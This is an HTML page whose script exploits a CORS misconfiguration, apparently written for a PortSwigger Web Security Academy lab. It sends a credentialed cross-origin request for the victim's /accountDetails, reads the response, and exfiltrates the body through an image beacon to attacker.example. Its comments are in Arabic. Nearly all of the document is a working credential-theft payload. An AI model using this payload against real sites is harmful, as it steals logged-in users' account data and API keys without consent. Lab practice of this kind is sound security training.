<!doctype html>
<html>
  <body>
    <script>
      (async () => {
        console.log('page origin =', location.origin); // تأكد إنها https://joo-ex.github.io

        try {
          const res = await fetch('https://0a3800a30493bae484aa2f7a002a00ce.web-security-academy.net/accountDetails', {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
            redirect: 'manual' // نمنع المتصفح يتبع redirect تلقائياً عشان نكشف 302
          });

          console.log('fetch status', res.status);
          // اطبع الهيدرز المتاحة
          for (const h of res.headers.entries()) console.log('header', h[0], ':', h[1]);

          // لو الاستجابة مقروءة، اقرأ النص
          const text = await res.text().catch(()=>null);
          console.log('body preview', text && text.slice(0,300));

          if (text) {
            // exfiltrate via image beacon
            const img = new Image();
            img.src = 'https://attacker.example/collect?data=' + encodeURIComponent(text);
            document.body.appendChild(img);
          } else {
            console.warn('no readable body — likely blocked by CORS or redirect');
          }
        } catch (e) {
          console.error('fetch error', e);
        }
      })();
    </script>
  </body>
</html>







